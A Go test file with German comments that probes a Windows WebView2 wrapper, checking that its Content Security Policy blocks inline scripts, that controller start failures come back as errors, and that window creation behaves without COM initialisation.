// openOhneCOM öffnet ein Fenster auf einem Thread, der COM nicht initialisiert hat.
func (b *probeBed) openOhneCOM(ohnePruefung bool) error {
	host, err := NewHost(HostConfig{App: "probe", Gateway: b.gw, Lokal: probeLokal{}, Wake: func() {}})
	if err != nil {
		return err
	}
	dir, err := os.MkdirTemp("", "jnpt-probe-")
	if err != nil {
		return err
	}
	defer os.RemoveAll(dir)
	if err := os.WriteFile(filepath.Join(dir, "index.html"), []byte(probePage("", "x")), 0o600); err != nil {
		return err
	}
	o := &Opened{Name: "probe", Dir: dir, UserDataDir: filepath.Join(dir, "webview"), Host: host}
	s, err := NewSurface(o, SurfaceConfig{noThreadCheck: ohnePruefung})
	if err == nil {
		s.Close()
	}
	return err
}

func openSurfaces() int {
	surfacesMu.Lock()
	defer surfacesMu.Unlock()
	return len(surfaces)
}

// removeWhenFree löscht den Datenordner des Browsers, sobald dessen Prozesse die Dateien freigeben. Gelingt es
// nicht, ist das ein Hinweis (der Widerruf des Läufers löscht ihn dann beim nächsten Versuch), kein Sondenfehler.
func removeWhenFree(t *testing.T, dir string) {
	var err error
	for i := 0; i < 40; i++ {
		if err = os.RemoveAll(dir); err == nil {
			return
		}
		time.Sleep(250 * time.Millisecond)
	}
	t.Logf("Hinweis: Datenordner nach 10 s noch gesperrt (%v)", err)
}

// CSP in der Praxis: Ein Inline-Skript läuft nicht (script-src 'self'), ein Skript als Datei schon. Das ist die
// Kontrolle dafür, dass die übrigen Sonden ihre Auslöser als Dateien liefern müssen.
func TestWindowsWebViewInlineSkriptBlockiert(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		s, _, _ := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<script>send("inline", {});</script><script src="datei.js"></script>`),
			"probe.js":   probeJS,
			"datei.js":   `send("datei", {});`,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("datei ") }) {
			t.Fatal("Skript als Datei läuft nicht: Die Seite lädt nicht oder die Brücke antwortet nicht")
		}
		pump(t, s, time.Second, nil)
		if b.gw.has("inline ") {
			t.Fatal("Inline-Skript lief trotz CSP")
		}
	})
}

// SEC Bedingung 3 am echten WebView2: Scheitert der Controller-Start (Elternfenster 0 gibt es nicht), meldet die
// Kopie den ersten Fehler an den Aufrufer, statt den Prozess zu beenden oder zu hängen. Der Test-Prozess lebt
// danach, und die Nachrichtenverteilung läuft weiter.
func TestWindowsEdgeControllerFehlerBleibtFehler(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		dir, err := os.MkdirTemp("", "jnpt-probe-")
		if err != nil {
			t.Fatal(err)
		}
		b.closers = append(b.closers, func() { removeWhenFree(t, dir) })
		c := edge.NewChromium()
		var reported []string
		c.SetErrorCallback(func(err error) { reported = append(reported, fenster.DiagText(err.Error())) })
		c.DataPath = filepath.Join(dir, "webview")
		if err := c.Begin(0); err != nil {
			t.Logf("Begin meldet sofort: %v (auch ein fester Fehler beim Aufrufer)", err)
			return
		}
		s := &Surface{}
		start := time.Now()
		err = WaitFor(startFrist, s.pumpOnce, c.Ready)
		c.Cancel()
		t.Logf("Ergebnis nach %v: %v; Fehlerrückrufe: %v", time.Since(start), err, reported)
		if err == nil {
			c.Close()
			t.Fatal("Controller mit Elternfenster 0 wurde angenommen: Die Sonde kann den Fehlerpfad nicht erzwingen")
		}
		if errors.Is(err, ErrStartFrist) {
			t.Fatalf("keine Rückmeldung innerhalb %v: Der Fehler kam nicht als Fehler an", startFrist)
		}
		if !pump(t, nil, 200*time.Millisecond, nil) {
			t.Fatal("Nachrichtenverteilung blockiert nach dem Fehler")
		}
	})
}
